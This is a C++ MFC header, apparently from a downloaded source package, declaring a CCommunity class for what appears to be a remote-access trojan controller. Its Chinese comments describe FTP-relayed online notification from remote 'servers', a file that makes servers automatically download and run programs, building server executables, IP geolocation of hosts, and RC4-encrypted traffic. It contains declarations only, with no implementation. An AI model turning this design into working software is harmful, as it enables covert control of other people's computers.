//Download by http://www.NewXing.com
// Community.h: interface for the CCommunity class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_COMMUNITY_H__C13CA113_E018_11D4_89D9_F84105C10000__INCLUDED_)
#define AFX_COMMUNITY_H__C13CA113_E018_11D4_89D9_F84105C10000__INCLUDED_

#if _MSC_VER >= 1000
#pragma once
#endif // _MSC_VER >= 1000

#include <afxinet.h>
#include "IPToLocal.h"      //包含找对方地址的类
#include <afxmt.h>
//*************************************
#pragma pack(1) //字节对齐

typedef struct
{
	CListCtrl*	pList;
	int			nSubItem;
	BOOL		bAscending;
}
SORT_ITEMS,*pSORT_ITEMS;

typedef struct rc4_key
{
	unsigned char state[256];
	unsigned char x;
	unsigned char y;
} rc4_key;

#pragma pack()	//使用缺省对齐

#define swap_byte(x,y) t = *(x); *(x) = *(y); *(y) = t
//*************************************
class CCommunity  
{
public:
	CCommunity();
	virtual ~CCommunity();

public:
	//*****************************************************************
	////////////////////////成员变量/////////////////////////////
	BOOL				m_bIsRegistered;	//客户端是否已经注册

	CString				m_strFtpServerAddress;	//FTP服务器的域名或IP地址
	CString				m_strFtpUsername;		//主页空间的用户名
	CString				m_strFtpPassword;		//主页空间的密码
	CString				m_strHomepage;			//主页空间的网址
	CString				m_strFileSavePath;		//FTP服务器上存放数据文件的目录
	CString				m_strNotifyFilename;	//用于实现服务端上线通知的主页空间临时文件
	CString				m_strConnectFilename;	//用于与服务端建立连接的主页空间临时文件
	CString				m_strClientFilename;	//用于保持FTP登录状态的主页空间临时文件
	CString				m_strDownloadFilename;	//用于服务端自动下载并运行程序
	CString				m_strDataPassword;		//数据加密密钥

	BYTE				m_byCheckSum_NotifyPack[16];//服务端上线通知包的MD5校验和

	int					m_nSubItem;			//列表排列方式
	BOOL				m_bAscending;		//排列顺序

	CString				m_strHostName;	//客户端的用户名
	CString				m_strIPAddr;	//客户端的IP地址
	CString				m_strPosition;	//客户端的地理位置
	int					m_nOnlineNum;	//在线数

	CInternetSession	m_Session;		//Internet会话
	CFtpConnection*		m_pFtpConn;		//FTP连接

	SOCKET				m_hNotifySocket;	//UDP上线通知,Listening UDP 60000
	SOCKET				m_hListenSocket;	//TCP上线通知,Listening TCP 60001

	CCriticalSection	m_CriticalSection;//临界段
	CCriticalSection	m_CriticalSection_List;//临界段
	////////////////////////成员函数/////////////////////////////
	void	SetFtpServerInfo(int nControlCode,
				CString strAddress,CString strUsername,CString strPassword,CString strHomepage,
				CString strPath,CString strNotifyFilename,CString strConnectFilename,CString strClientFilename,
				CString strDownloadFilename,
				CString strDataPassword);
	BOOL	IsOnline();
	BOOL	BuildServer(CString strKeyName,CString strFilename,CString strNote,CString strServerFilename);
	int		ConnectFtpServer(CWnd* pWnd);
	BOOL	KeepFtpSession();
	BOOL	RecvNotify(SOCKET hSocket,CListCtrl* pList,CMapStringToString* pHostRemarkMap);
	BOOL	AcceptTcpConnect(CWnd* pWnd);
	BOOL	ListRefresh(CListCtrl* pList);
	BOOL	GetCallboardText(CEdit* pEdit_Callboard);
	int		RefreshChatroom();
	void 	SortItems(CListCtrl* pList,int nSubItem);
	void	GetNewVersionDateInfo(CString* strNewVersion,CString* strNewDate);
	void	LogonCurrentSetting();
	CString	GetBindIP();

	BOOL	NotifyClientConnect(CString strClientName);
	int		HomepageTest(CEdit* pEdit_Test);
	BOOL	UpdateDownloadSetting(CString strURL,CString strFilename);
	//*****************************************************************
private:
	//*****************************************************************
	////////////////////////成员变量/////////////////////////////
	CIPToLocal	m_IPToLocal;  //找用户地址的类
	char		m_cHostname[128];
	////////////////////////成员函数/////////////////////////////
	void		CStringToChar(char* cText,CString strText);
	CString		CharToCString(char* cText,UINT nSize);
	CString		RegReadValue(HKEY hKey,CString sKey,CString sChildKey);
	void		prepare_key(unsigned char *key_data_ptr, int key_data_len, rc4_key *key);
	void		rc4(unsigned char *buffer_ptr, DWORD buffer_len, rc4_key *key);
	void		EncryptData(LPVOID pVoid,DWORD dwBufLen,CString strKey);
	CString		GetCurDir();
	int			GetINIfileInt(LPCTSTR lpSectionName,  //从INI中读取整型值
					LPCTSTR lpKeyName);
	BOOL		WriteINIfileInt(LPCTSTR lpSectionName, //向INI中写入整型值
					LPCTSTR lpKeyName,INT nValue);
	CString		GetINIfileString(LPCTSTR lpSectionName, //从INI中读取字符值
					LPCTSTR lpKeyName);
	BOOL		WriteINIfileString(LPCTSTR lpSectionName,  //向INI中写入字符值
					LPCTSTR lpKeyName,LPCTSTR lpString);
	static int	CALLBACK CompareFunc(LPARAM lParam1, LPARAM lParam2,LPARAM lParamSort);
	void		ShowSelectIPDialog();
	void		ShowEditText(CEdit* pEdit_Test,CString strText);
	//*****************************************************************
};

#endif // !defined(AFX_COMMUNITY_H__C13CA113_E018_11D4_89D9_F84105C10000__INCLUDED_)
